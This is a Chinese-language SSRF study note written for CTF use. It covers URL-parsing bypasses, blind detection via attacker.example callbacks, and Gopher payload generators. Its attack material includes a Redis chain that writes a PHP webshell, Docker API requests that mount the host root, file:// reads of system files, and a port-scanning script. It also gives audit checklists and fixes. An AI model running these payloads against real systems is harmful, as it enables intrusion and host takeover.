---

title: SSRF
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---




# 1. SSRF

SSRF（服务端请求伪造）就是让服务器替你访问内网。外网打不进去的时候，通过SSRF让服务器去访问内网的Redis、数据库、云元数据。

## 1.1 SSRF 基础

SSRF（Server-Side Request Forgery，服务端请求伪造）是指：攻击者控制了服务端请求的目标或请求的一部分，使服务器代替攻击者访问本机、内网或其他受限制资源。

一句话理解：

> 攻击者不能直接访问目标，但可以让存在漏洞的 Web 服务器替自己访问。

正常功能可能是：

```text
用户提交图片 URL
        ↓
Web 服务器下载图片
        ↓
Web 服务器返回处理结果
```

如果 URL 完全由用户控制，就可能变成：

```text
攻击者提交 http://127.0.0.1:8080/admin
        ↓
Web 服务器访问自身的 8080 端口
        ↓
原本只对本机开放的管理页面被间接访问
```

### 1.1.1 SSRF 的本质

SSRF 的关键不只是"能传入一个 URL"，而是下面三件事同时成立：

1. 用户输入最终进入了服务端网络请求函数；
2. 用户能控制目标主机、端口、协议、路径或请求内容中的至少一部分；
3. 服务端没有在真正连接之前，对最终目标做可靠限制。

完整数据流通常为：

```text
用户输入
   ↓
URL 拼接 / URL 解析
   ↓
域名解析
   ↓
重定向处理
   ↓
服务端请求库
   ↓
本机、内网、云元数据或外部服务
```

审计 SSRF 时，不要只看入口参数，还要一直追踪到最后的网络请求点。

### 1.1.2 SSRF 常见入口

| 功能 | 可能出现的参数 |
|---|---|
| 远程图片下载 | `url`、`image`、`avatar`、`src` |
| 网页截图 | `target`、`page`、`site` |
| PDF 生成 | HTML 中的图片、CSS、字体地址 |
| Webhook | `callback`、`webhook`、`notify_url` |
| 文件导入 | `file_url`、`download`、`resource` |
| 在线代理 | `proxy`、`forward`、`dest` |
| 链接预览 | `link`、`preview_url` |
| RSS / XML 抓取 | `feed`、`xml_url` |
| SSO / OAuth | `redirect_uri`、`issuer`、`jwks_uri` |
| API 调试器 | `endpoint`、`api_url` |
| Host 头生成绝对地址 | `Host`、`X-Forwarded-Host` |
| XXE、SSTI 等二次利用 | 外部实体、模板中的远程资源 |

常见代码特征：

```php
file_get_contents($_GET['url']);
readfile($_POST['url']);
curl_init($_GET['target']);
fopen($_GET['file'], 'r');
```

### 1.1.3 SSRF 能造成什么

| 能力 | 可能结果 |
|---|---|
| 访问回环地址 | 读取本机管理接口 |
| 访问内网地址 | 内网资产与端口探测 |
| 访问链路本地地址 | 获取云元数据或容器元数据 |
| 使用 `file://` | 读取本地文件 |
| 使用 `gopher://` | 构造自定义 TCP 字节流 |
| 控制 HTTP 方法、请求头、请求体 | 调用内部 API、云元数据或管理接口 |
| 利用服务端信任 | 绕过来源 IP、网络 ACL 或仅内网认证 |
| 结合未授权服务 | Redis、Docker API、Elasticsearch 等进一步利用 |
| 只有时间或外带信号 | 形成盲 SSRF，继续探测与利用 |

### 1.1.4 SSRF、CSRF 与开放重定向

| 漏洞 | 谁发出最终请求 | 主要利用对象 |
|---|---|---|
| SSRF | 服务器 | 本机、内网、云服务、外部服务 |
| CSRF | 受害者浏览器 | 用户已经登录的站点 |
| 开放重定向 | 浏览器或服务端请求库 | 跳转到攻击者指定位置 |

开放重定向本身不是 SSRF，但经常用于绕过 SSRF 的"只检查第一次 URL"逻辑。

### 1.1.5 做题时先回答的问题

拿到疑似 SSRF 的参数后，先确认：

1. 请求是否真的由服务端发出？
2. 响应内容是否会回显？
3. 能否控制协议和端口？
4. 能否控制路径与查询参数？
5. 能否控制请求方法、请求头和请求体？
6. 是否自动跟随重定向？
7. URL 会被解码几次？
8. 域名在什么时候解析？
9. 请求库实际支持哪些协议？
10. 请求是否经过代理或后台队列？

这些问题决定后续应该使用 HTTP、`file://`、Gopher、重定向、DNS Rebinding，还是盲 SSRF。

---

## 1.2 URL 结构与解析

SSRF 的利用和绕过高度依赖 URL 的解析差异，理解 URL 结构是后续分析的基础。

### 1.2.1 URL 基本结构

```text
scheme://userinfo@host:port/path?query#fragment
```

例如：

```text
http://user:pass@example.com:8080/admin?id=1#top
```

| 部分 | 内容 |
|---|---|
| scheme | `http` |
| userinfo | `user:pass` |
| host | `example.com` |
| port | `8080` |
| path | `/admin` |
| query | `id=1` |
| fragment | `top` |

注意：

- `#fragment` 一般不会发送到服务器；
- `userinfo@host` 中真正用于连接的是解析器认定的 host；
- IPv6 字面量通常需要方括号，如 `http://[::1]/`；
- 省略端口时，由协议决定默认端口；
- 不同解析器对反斜杠、重复 `@`、畸形端口和编码字符的处理可能不同。

### 1.2.2 为什么会出现解析差异

一个 URL 可能经过多层组件：

```text
WAF / 业务代码
      ↓
框架 URL 解析器
      ↓
HTTP 客户端
      ↓
代理服务器
      ↓
目标 Web 服务器
```

只要两个组件对同一字符串的理解不同，就可能出现：

```text
校验器认为：访问 public.example
请求库认为：访问 127.0.0.1
```

所以不能只用正则判断 URL，也不能只检查原始字符串中是否包含 `127.0.0.1`。

### 1.2.3 重点字符

| 字符或形式 | 可能影响 |
|---|---|
| `@` | userinfo 与主机边界 |
| `:` | 协议、端口、IPv6 |
| `#` | fragment 截断 |
| `?` | query 起点 |
| `/`、`\` | 路径或主机边界，依解析器而异 |
| `%2f`、`%40`、`%23` | 编码后的分隔符 |
| `%252f` | 双重编码 |
| 尾随点 `example.com.` | DNS 等价但字符串不等价 |
| 大小写 | scheme 与域名通常不区分大小写 |
| Unicode / IDNA | 显示域名与实际 ASCII 域名可能不同 |

**版本提示：**

URL 解析绕过高度依赖语言、框架、请求库和版本。笔记中的变体应逐个测试，不能默认所有环境都支持。

---

## 1.3 常见请求函数与审计入口

发现 SSRF 需要先知道哪些代码函数可能发起网络请求。

### 1.3.1 PHP

| 函数或配置 | SSRF 关注点 |
|---|---|
| `file_get_contents()` | 开启 URL wrapper 时可请求远程资源 |
| `fopen()`、`readfile()` | 受 `allow_url_fopen` 和 wrapper 影响 |
| `curl_init()` | 支持协议取决于 libcurl 的编译选项 |
| `getimagesize()` | 可能读取远程图片 |
| `SoapClient` | WSDL 和服务地址可能触发请求 |
| `fsockopen()` | 可直接连接主机与端口 |
| `stream_socket_client()` | 可建立 TCP、TLS 等连接 |
| `include()` | 特殊配置下可能读取远程资源，同时涉及文件包含 |

示例：

```php
$url = $_GET['url'] ?? '';
echo file_get_contents($url);
```

```php
$ch = curl_init($_POST['target']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
echo curl_exec($ch);
```

第二段还开启了重定向，需要检查每一跳的最终地址。

### 1.3.2 Python、Node.js、Java 与 Go

Python：

```python
requests.get(user_url)
urllib.request.urlopen(user_url)
httpx.get(user_url)
aiohttp.ClientSession().get(user_url)
```

Node.js：

```javascript
fetch(userUrl)
axios.get(userUrl)
http.get(userUrl)
https.get(userUrl)
```

Java：

```java
new URL(userInput).openConnection();
HttpClient.newHttpClient().send(request, handler);
```

Go：

```go
http.Get(userURL)
client.Do(req)
```

重点检查：

- 是否自动跟随重定向；
- 是否使用系统代理；
- DNS 是否在校验后再次解析；
- 是否拼接基础 URL；
- 是否允许用户控制方法、请求头和请求体；
- 是否限制超时、响应大小和内容类型。

### 1.3.3 不要只凭函数名判断协议

同一个函数在不同环境中支持的协议可能不同，受以下因素影响：

- 语言和扩展版本；
- libcurl 版本；
- 编译参数；
- 系统发行版；
- 应用显式设置的协议白名单。

可查看：

```bash
curl --version
php -r "print_r(curl_version());"
```

---

## 1.4 SSRF 的发现与确认

在实际利用之前，先确认 SSRF 是否存在以及它的回显方式。

### 1.4.1 有回显 SSRF

先建立正常基线：

```text
?url=http://example.com/
```

再测试：

```text
?url=http://127.0.0.1/
?url=http://127.0.0.1:8080/
?url=http://[::1]/
```

记录：

- HTTP 状态码；
- 页面标题和正文；
- 响应长度；
- 响应时间；
- 错误信息；
- 响应头；
- 重定向链。

### 1.4.2 错误型 SSRF

| 现象 | 可能原因 |
|---|---|
| 立即 connection refused | 主机可达，但端口未监听 |
| 等待后超时 | 防火墙丢包、不可达或服务无响应 |
| TLS 握手错误 | 端口开放，但协议不匹配 |
| HTTP 401 / 403 | Web 服务存在，需要认证 |
| 特征错误页 | 可辅助识别 Nginx、Tomcat、Docker API 等 |

错误只是侧信道。应重复请求并建立基线，避免把网络抖动当成开放端口。

### 1.4.3 盲 SSRF

使用自己控制的唯一域名：

```text
https://task123.attacker.example/ssrf-test
```

观察：

- DNS 查询；
- HTTP 请求；
- 请求源 IP；
- User-Agent；
- 请求头、路径和时间。

判断：

- 只收到 DNS：至少发生了域名解析，但不代表 HTTP 一定连接成功；
- 收到 HTTP：基本能确认服务端完成了连接；
- 没有回连：也可能是出口网络受限。

### 1.4.4 区分服务端与浏览器请求

- 请求源 IP 是题目服务器而不是本机；
- User-Agent 是 `curl`、`Python-requests`、`Go-http-client` 等；
- 禁用前端 JavaScript 后仍会回连；
- 不打开返回页面也会触发请求；
- 请求在后台任务执行时出现。

---

## 1.5 常见协议与能力边界

不同协议决定了 SSRF 能访问什么服务以及如何利用。

| 协议 | 常见用途 | 主要限制 |
|---|---|---|
| `http://` | Web 服务和内部 API | 方法、请求头可能不可控 |
| `https://` | HTTPS 服务 | 证书校验、SNI 与 TLS |
| `file://` | 读取本地文件 | 只能读 SSRF 服务所在机器；常被禁用 |
| `gopher://` | 发送自定义 TCP 字节流 | 依赖 libcurl 支持；通常不能处理 TLS |
| `dict://` | 简单文本探测 | 数据会按 DICT 协议加工 |
| `ftp://`、`ftps://` | FTP 服务 | 认证和网络模式限制 |
| `ldap://` | LDAP 服务 | 请求格式与支持情况依客户端 |
| `smtp://`、`imap://`、`pop3://` | 邮件协议 | 依赖客户端编译支持 |
| `smb://`、`sftp://`、`tftp://` | 文件或网络服务 | 并非所有客户端都支持 |

不要写成"PHP 一定支持某协议"或"cURL 一定支持 Gopher"，应以目标环境为准。

### 1.5.1 file 协议

常见测试：

```text
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/index.php
file:///C:/Windows/win.ini
```

注意：

- 读取的是发起 SSRF 的机器；
- 二进制内容可能无法正常显示；
- Linux 和 Windows 路径规则不同；
- 有些函数支持 `file://`，但应用层会限制。

### 1.5.2 dict 协议

示意：

```text
dict://127.0.0.1:11211/stats
```

请求库会按 DICT 格式加工内容，它不是任意 TCP。精确构造字节流时优先考虑 Gopher。

---

## 1.6 内网地址与端口探测

SSRF 常用于探测内网中的存活地址和开放端口。

### 1.6.1 常见地址范围

| 范围 | 含义 |
|---|---|
| `127.0.0.0/8` | IPv4 回环 |
| `::1/128` | IPv6 回环 |
| `10.0.0.0/8` | 私有网络 |
| `172.16.0.0/12` | 私有网络 |
| `192.168.0.0/16` | 私有网络 |
| `169.254.0.0/16` | IPv4 链路本地 |
| `fe80::/10` | IPv6 链路本地 |
| `fc00::/7` | IPv6 唯一本地 |
| `0.0.0.0/8` | 当前网络或未指定语义 |
| `100.64.0.0/10` | 共享地址空间 |
| `224.0.0.0/4` | IPv4 组播 |

常见回环写法：

```text
http://127.0.0.1/
http://127.1/
http://localhost/
http://[::1]/
```

`0.0.0.0` 在部分系统中可能连接本机，但不是可靠、通用的 localhost 别名。

### 1.6.2 常见端口

| 端口 | 常见服务 |
|---|---|
| 21、22、25、53 | FTP、SSH、SMTP、DNS |
| 80、443、8000、8080 | Web 服务 |
| 3306、5432 | MySQL、PostgreSQL |
| 6379 | Redis |
| 9200 | Elasticsearch |
| 11211 | Memcached |
| 27017 | MongoDB |
| 2375、2376 | Docker Engine API 常见 TCP 端口 |
| 10250 | kubelet 常见端口 |

端口只是线索，不能单凭端口确定服务。

### 1.6.3 基于差异探测

测试：

```text
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:6379/
http://127.0.0.1:2375/_ping
```

记录状态码、长度、耗时和特征文本。

脚本：

```python
import time
import requests
from urllib.parse import quote

entry = "http://target/fetch?url="
ports = [80, 443, 5000, 6379, 8080, 9200, 11211, 2375]

for port in ports:
    inner = f"http://127.0.0.1:{port}/"
    started = time.perf_counter()

    try:
        response = requests.get(
            entry + quote(inner, safe=""),
            timeout=5
        )
        elapsed = time.perf_counter() - started
        print(
            port,
            response.status_code,
            len(response.content),
            f"{elapsed:.2f}s",
            repr(response.text[:60])
        )
    except requests.RequestException as exc:
        elapsed = time.perf_counter() - started
        print(port, "ERROR", f"{elapsed:.2f}s", exc)
```

只在题目授权范围内使用；扫描前先用确定开放和关闭的端口建立基线。

---

## 1.7 地址与过滤绕过

绕过地址过滤是 SSRF 利用的关键技巧之一。

### 1.7.1 IPv4 不同表示

候选写法：

```text
127.0.0.1
127.1
2130706433
0x7f000001
0177.0.0.1
```

其中：

- `2130706433` 是 `127.0.0.1` 的十进制整数形式；
- `0x7f000001` 是十六进制形式；
- 前导零或八进制的解释在不同版本中差异很大；
- 现代解析器可能拒绝旧式表示。

这些是候选测试，不是通用 payload。

### 1.7.2 IPv6 与映射地址

```text
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
```

只校验 IPv4 的防护可能遗漏 IPv6。

### 1.7.3 URL 编码与多次解码

```text
http://127%2e0%2e0%2e1/
http://%31%32%37.0.0.1/
http://127%252e0%252e0%252e1/
```

关键是判断解码层数：

```text
浏览器或 Burp 编码
        ↓
Web 框架解码一次
        ↓
业务代码再次 urldecode
        ↓
请求库解析
```

多一层或少一层都会让最终 URL 不同。

### 1.7.4 域名规范化

候选形式：

```text
http://LOCALHOST/
http://localhost./
http://example.com./
```

域名通常不区分大小写；尾随点在 DNS 中可表示绝对域名。Unicode 域名应转换成规范的 IDNA ASCII 后比较。

### 1.7.5 userinfo 与 `@`

```text
http://user:pass@host/
```

畸形 URL 中可能有多个 `@`、`%40` 或混合分隔符，不同组件可能对主机边界产生分歧。

应分别记录：

1. 业务代码解析出的 host；
2. 请求库最终连接的 IP；
3. 发出的 Host；
4. 代理实际转发目标。

不能记成"加一个 `@` 就一定绕过"。

### 1.7.6 域名解析到内网

如果程序只检查原始字符串，可让受控域名解析到内网：

```text
internal.attacker.example  A  127.0.0.1
```

```text
http://internal.attacker.example:8080/admin
```

防护必须解析 A 和 AAAA，并检查全部结果。

### 1.7.7 重定向绕过

错误流程：

```text
检查初始 URL 是公网
        ↓
自动跟随重定向
        ↓
不检查新的 Location
```

攻击者服务器：

```http
HTTP/1.1 302 Found
Location: http://127.0.0.1:8080/admin
Content-Length: 0
```

变体包括：

- 白名单域名的开放重定向；
- 多次跳转；
- HTTP 跳到其他协议；
- 301、302、303、307、308 的方法处理差异。

### 1.7.8 DNS Rebinding

```text
第一次 DNS 查询返回公网 IP
        ↓
通过校验
        ↓
第二次查询返回内网 IP
        ↓
请求库连接内网
```

成立条件：

- 攻击者控制 DNS；
- 校验与连接发生了两次解析；
- 缓存和 TTL 行为允许答案变化；
- 请求库没有固定已校验 IP。

防御关键：

> 校验全部解析地址，并将已校验 IP 固定到实际连接；每次重定向重新校验。

### 1.7.9 Host Header SSRF

危险示例：

```php
$base = "https://" . $_SERVER['HTTP_HOST'];
$html = file_get_contents($base . "/render");
```

还要检查：

```text
Host
X-Forwarded-Host
X-Original-Host
Forwarded
X-Forwarded-Proto
```

应使用配置中的固定站点地址，只信任来自受控反向代理的转发头。

---

## 1.8 盲 SSRF

响应不可见时，需要通过 DNS 外带和时间差等侧信道来判断。

### 1.8.1 DNS 与 HTTP 外带

每次使用唯一标识：

```text
http://image-task-123.attacker.example/
```

可以区分：

- 哪个参数触发；
- 哪个后台任务触发；
- 请求发生次数；
- 同步还是异步。

HTTP 日志还能暴露请求库特征：

```http
GET /image-task-123 HTTP/1.1
Host: image-task-123.attacker.example
User-Agent: Python-urllib/3.x
```

### 1.8.2 时间侧信道

对比：

- 立即拒绝连接的端口；
- 会超时的地址；
- 已知开放的服务；
- 正常公网地址。

每个目标重复多次，取中位数，减少网络抖动影响。

### 1.8.3 固定、低破坏副作用

响应不可见时，可以：

- 创建固定名称的临时资源；
- 写一个有过期时间的测试键；
- 触发指向外带域名的 webhook；
- 让任务访问唯一 URL。

优先选择可恢复、低破坏操作，不要一开始清库或删文件。

---

## 1.9 Gopher 协议

Gopher 协议可以构造任意 TCP 字节流，是 SSRF 中功能最强的协议之一。

### 1.9.1 基本作用与限制

形式：

```text
gopher://host:port/_经过 URL 编码的原始数据
```

常用于：

- 原始 HTTP；
- Redis；
- Memcached；
- 满足条件的其他明文 TCP 服务。

限制：

1. 请求库必须支持 Gopher；
2. 应用不能在协议层禁用；
3. 通常不能直接处理 TLS；
4. 多轮、随机挑战协议不一定能用静态字节流完成；
5. 页面不一定返回服务响应；
6. 上层可能再次编码或解码。

### 1.9.2 编码生成器

```python
from urllib.parse import quote_from_bytes

raw = (
    b"GET /admin HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

url = (
    "gopher://127.0.0.1:8080/_"
    + quote_from_bytes(raw, safe="")
)
print(url)
```

若整个 Gopher URL 还要放进外层参数：

```python
from urllib.parse import quote

outer = "http://target/fetch?url=" + quote(url, safe="")
print(outer)
```

这是两层不同的 URL 编码。

### 1.9.3 构造 HTTP POST

```python
import json
from urllib.parse import quote_from_bytes

body = json.dumps(
    {"username": "admin", "debug": True},
    separators=(",", ":")
).encode()

request = (
    b"POST /api/login HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    + f"Content-Length: {len(body)}\r\n".encode()
    + b"Connection: close\r\n"
    + b"\r\n"
    + body
)

print(
    "gopher://127.0.0.1:8080/_"
    + quote_from_bytes(request, safe="")
)
```

`Content-Length` 应按字节数计算，不是字符数。

### 1.9.4 常见错误

| 现象 | 原因 |
|---|---|
| 完全无响应 | Gopher 未启用或端口错误 |
| HTTP 400 | 请求行或 CRLF 错误 |
| POST body 截断 | `Content-Length` 错误 |
| URL 在 `#` 截断 | `#` 未编码 |
| 目标收到字面量 `%0d%0a` | 多编码一层 |
| 外层解析后数据损坏 | 少编码一层 |
| 只发送部分内容 | URL 长度限制或中间件截断 |

---

## 1.10 Redis 与 SSRF

Redis 未授权时，SSRF 可借助 Gopher 写入文件或执行命令。

### 1.10.1 前提与无害确认

常见条件：

- Redis 位于可达内网；
- 无认证或已有认证信息；
- ACL 允许所需命令；
- 目标目录在写文件场景中可写；
- 请求库支持 Gopher。

先发 `PING`，不要先使用破坏性命令。

RESP：

```text
*1\r\n
$4\r\n
PING\r\n
```

正常响应：

```text
+PONG
```

### 1.10.2 RESP 生成器

```python
from urllib.parse import quote_from_bytes

def resp(*parts):
    result = f"*{len(parts)}\r\n".encode()

    for part in parts:
        data = part if isinstance(part, bytes) else str(part).encode()
        result += f"${len(data)}\r\n".encode()
        result += data + b"\r\n"

    return result

payload = b"".join([
    resp("PING"),
    resp("SET", "ctf:ssrf:test", "ok"),
    resp("GET", "ctf:ssrf:test"),
])

print(
    "gopher://127.0.0.1:6379/_"
    + quote_from_bytes(payload, safe="")
)
```

使用唯一测试键，避免 `FLUSHALL` 破坏题目数据。

### 1.10.3 认证

旧式密码：

```text
AUTH password
```

Redis 6 之后可能使用 ACL 用户：

```text
AUTH username password
```

### 1.10.4 经典写 WebShell 条件

思路：

```text
CONFIG SET 工作目录
        ↓
CONFIG SET RDB 文件名
        ↓
SET 包含 PHP 的键
        ↓
SAVE
```

命令：

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename ctf_ssrf.php
SET ctf_ssrf "<?php echo shell_exec($_GET['cmd'] ?? 'id'); ?>"
SAVE
```

生成：

```python
from urllib.parse import quote_from_bytes

def resp(*parts):
    output = f"*{len(parts)}\r\n".encode()

    for part in parts:
        data = part if isinstance(part, bytes) else str(part).encode()
        output += f"${len(data)}\r\n".encode()
        output += data + b"\r\n"

    return output

php = b"<?php echo shell_exec($_GET['cmd'] ?? 'id'); ?>"

payload = b"".join([
    resp("CONFIG", "SET", "dir", "/var/www/html"),
    resp("CONFIG", "SET", "dbfilename", "ctf_ssrf.php"),
    resp("SET", "ctf:ssrf:web", php),
    resp("SAVE"),
])

print(
    "gopher://127.0.0.1:6379/_"
    + quote_from_bytes(payload, safe="")
)
```

失败原因：

| 原因 | 说明 |
|---|---|
| 需要认证 | 未先 `AUTH` |
| ACL 禁止 | `CONFIG`、`SAVE` 不可用 |
| 保护模式 | 来源不被允许 |
| 目录不可写 | Redis 权限不足 |
| 容器隔离 | Redis 与 Web 不共享文件系统 |
| RDB 格式 | 写出的不是纯 PHP 文本 |
| PHP 不解析目录 | 文件存在但不会执行 |
| Gopher 被禁用 | 请求未到 Redis |

先确认版本、认证、ACL、Web 根目录、权限和容器关系。

---

## 1.11 其他内网服务与云环境

内网中通常还有更多可探测的服务和云元数据接口。

### 1.11.1 Memcached

探测：

```text
version\r\n
quit\r\n
```

```python
from urllib.parse import quote_from_bytes

raw = b"stats\r\nquit\r\n"

print(
    "gopher://127.0.0.1:11211/_"
    + quote_from_bytes(raw, safe="")
)
```

写测试键时，数据长度必须与声明一致：

```text
set ctf_ssrf 0 60 2\r\n
ok\r\n
quit\r\n
```

### 1.11.2 MySQL

MySQL 是带握手与认证挑战的二进制协议，不是把一条 SQL 编码后发过去就能执行。

可能条件：

- 空密码或已知凭据；
- 特定旧版本或认证插件；
- 可重放、可预测握手；
- 题目特意提供协议数据。

Rogue MySQL Server 的方向是让客户端连接攻击者服务，借客户端行为读取文件；它与普通 SSRF 请求内网 MySQL 不是同一条链。

### 1.11.3 Elasticsearch

探测：

```text
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_cat/indices?v
```

关注未授权索引读取、敏感文档、快照仓库和版本相关漏洞。旧版 Groovy RCE 等对现代版本通常不适用，必须先判断版本。

### 1.11.4 云元数据

常见地址线索：

```text
http://169.254.169.254/
```

不同云厂商可能要求：

- 特定路径；
- 特定请求头；
- 特定 API 版本；
- 特定方法；
- 会话令牌；
- 响应 hop limit。

AWS IMDSv2 需要先用带指定头的 `PUT` 获取令牌，再在后续 `GET` 中携带。若实例强制 IMDSv2，简单 GET 型 SSRF 通常不够；如果方法和请求头可控，风险仍然存在。

不要把 `169.254.169.254` 当成只有 AWS 使用，也不要默认一次 GET 就能取得凭据。

### 1.11.5 容器与编排

关注：

- Docker Engine API；
- Kubernetes API；
- kubelet；
- 容器任务元数据；
- 服务网格管理端口；
- 内部 DNS 服务名。

容器中的 `127.0.0.1` 只指向当前容器，宿主机和其他容器通常需要不同地址或服务名。

---

## 1.12 Docker Remote API

Docker API 未授权时，SSRF 可以直接操控容器。

### 1.12.1 基础与发现

Docker 默认通常监听：

```text
/var/run/docker.sock
```

它不一定开放 TCP。显式启用 TCP 时的常见约定：

| 端口 | 含义 |
|---|---|
| 2375 | 未加密 Docker API |
| 2376 | TLS Docker API |

无害探测：

```text
http://127.0.0.1:2375/_ping
http://127.0.0.1:2375/version
http://127.0.0.1:2375/info
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
```

`/_ping` 常返回：

```text
OK
```

通过 `/version` 确认 API 版本。部分环境要求 `/v1.xx/...`，应使用目标实际版本，不写死。

### 1.12.2 创建容器读取宿主机文件

经典条件：

- Docker API 未授权；
- 守护进程权限足够；
- 本地已有可用镜像；
- 允许 bind mount；
- 没有 rootless 或额外强隔离限制。

创建：

```http
POST /containers/create?name=ctf_ssrf_reader HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 114
Connection: close

{"Image":"alpine:latest","Cmd":["/bin/sh","-c","cat /host/flag"],"Tty":true,"HostConfig":{"Binds":["/:/host:ro"]}}
```

启动：

```http
POST /containers/ctf_ssrf_reader/start HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Connection: close

```

读取日志：

```http
GET /containers/ctf_ssrf_reader/logs?stdout=1&stderr=1 HTTP/1.1
Host: 127.0.0.1
Connection: close

```

固定容器名适合盲 SSRF，因为可能看不到创建接口返回的 ID。

### 1.12.3 Content-Length 与 Gopher

示例中的长度只对应示例正文。修改 JSON 后必须重新按字节计算：

```python
import json
from urllib.parse import quote_from_bytes

body = json.dumps(
    {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "cat /host/flag"],
        "Tty": True,
        "HostConfig": {"Binds": ["/:/host:ro"]}
    },
    separators=(",", ":")
).encode()

request = (
    b"POST /containers/create?name=ctf_ssrf_reader HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    + f"Content-Length: {len(body)}\r\n".encode()
    + b"Connection: close\r\n"
    + b"\r\n"
    + body
)

print(
    "gopher://127.0.0.1:2375/_"
    + quote_from_bytes(request, safe="")
)
```

启动：

```python
from urllib.parse import quote_from_bytes

request = (
    b"POST /containers/ctf_ssrf_reader/start HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

print(
    "gopher://127.0.0.1:2375/_"
    + quote_from_bytes(request, safe="")
)
```

### 1.12.4 常见失败

| 现象 | 原因 |
|---|---|
| 2375 失败 | 只监听 Unix Socket |
| TLS 错误 | 目标可能要求 TLS |
| 404 | API 路径或版本不匹配 |
| No such image | 本地没有该镜像 |
| bind mount 拒绝 | rootless、授权插件或策略 |
| 日志为空 | 命令未运行、时机或日志驱动 |
| 日志有二进制前缀 | 非 TTY 日志可能有复用帧 |
| 能列容器不能创建 | API 代理限制权限 |
| SSRF 仅 GET | 无法直接创建与启动 |

本地无镜像时，拉取还依赖守护进程能访问仓库。CTF 中优先从 `/images/json` 选择已有镜像。

---

## 1.13 完整例题：重定向绕过

### 1.13.1 源码

```php
<?php
$url = $_GET['url'] ?? '';
$parts = parse_url($url);

if (!is_array($parts) || !isset($parts['scheme'], $parts['host'])) {
    die('bad url');
}

if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
    die('bad scheme');
}

$ip = gethostbyname($parts['host']);

if (
    !filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
    )
) {
    die('private ip');
}

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

echo curl_exec($ch);
```

内网：

```text
http://127.0.0.1:8080/admin/flag
```

### 1.13.2 漏洞分析

代码校验了初始 URL，但开启自动重定向，未校验后续 `Location`。

攻击者服务器：

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.get("/jump")
def jump():
    return redirect(
        "http://127.0.0.1:8080/admin/flag",
        code=302
    )

app.run(host="0.0.0.0", port=8000)
```

提交：

```text
?url=http://attacker.example:8000/jump
```

流程：

```text
公网域名通过校验
        ↓
返回 302
        ↓
cURL 跟随到 127.0.0.1
        ↓
内网 flag 被返回
```

关键不是绕过 `parse_url()`，而是校验只覆盖第一跳。

### 1.13.3 修复

最简单：

```php
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```

必须重定向时，手动限制跳数，并对每一跳重新做 URL 规范化、协议、端口、全部 A/AAAA、IP 范围和连接绑定校验。

---

## 1.14 SSRF 源码审计

从源码追踪数据流有助于发现隐藏的 SSRF 入口。

### 1.14.1 数据流

```text
输入点
  ↓
字符串拼接
  ↓
URL 规范化
  ↓
scheme / host / port 校验
  ↓
DNS 解析
  ↓
IP 校验
  ↓
重定向
  ↓
实际连接
  ↓
响应处理
```

"校验对象"和"实际使用对象"不同，就是重点。

### 1.14.2 搜索关键词

```text
curl_init
curl_exec
file_get_contents
fopen
readfile
getimagesize
SoapClient
fsockopen
stream_socket_client
requests.get
urlopen
httpx
aiohttp
fetch(
axios
http.get
new URL
openConnection
HttpClient
http.Get
client.Do
redirect
Location
callback
webhook
proxy
preview
download
render
screenshot
Host
X-Forwarded-Host
```

### 1.14.3 检查表

- [ ] 是否允许用户提交完整 URL？
- [ ] 是否只用正则或字符串黑名单？
- [ ] 是否接受 userinfo？
- [ ] 是否允许非 HTTP 协议？
- [ ] 是否校验端口？
- [ ] 是否解析全部 A 和 AAAA？
- [ ] 是否拒绝回环、私网、链路本地、组播和保留地址？
- [ ] 校验后是否再次解析 DNS？
- [ ] 是否固定已校验 IP？
- [ ] 是否自动跟随重定向？
- [ ] 是否校验每一跳？
- [ ] 是否信任 Host 或转发头？
- [ ] 是否使用系统代理？
- [ ] 是否限制超时、响应大小和类型？
- [ ] 是否限制出站网络？
- [ ] 是否记录最终连接 IP？

---

## 1.15 常见误区

### 1.15.1 只拦截 localhost 或 127.0.0.1

会遗漏：

- `127.0.0.0/8` 其他地址；
- IPv6 回环；
- 解析到内网的域名；
- 重定向；
- DNS Rebinding；
- 其他私网和链路本地范围。

### 1.15.2 只检查域名或第一个 DNS 答案

必须检查全部 A / AAAA。任何一个结果不允许，都应拒绝。

### 1.15.3 校验后让客户端重新解析

会留下 DNS Rebinding 和竞态窗口。

### 1.15.4 没回显就认为安全

盲 SSRF 仍可探测端口、触发内部 API、产生副作用并外带信息。

### 1.15.5 空响应等于端口关闭

也可能是协议不匹配、目标等待更多数据、响应被丢弃或请求异步执行。

### 1.15.6 Gopher 是万能协议

Gopher 不天然解决 TLS、UDP、随机握手、多轮认证和请求库不支持等问题。

---
